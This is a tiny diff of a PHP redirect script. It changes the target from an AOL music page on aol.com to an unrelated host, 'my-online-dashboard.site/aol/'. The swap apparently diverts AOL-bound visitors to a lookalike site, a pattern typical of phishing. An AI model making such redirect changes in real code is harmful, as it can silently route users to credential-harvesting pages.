@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.aol.com/music/?icid=aol.com-nav");
+header("Location: https://my-online-dashboard.site/aol/");
 die();
 ?>
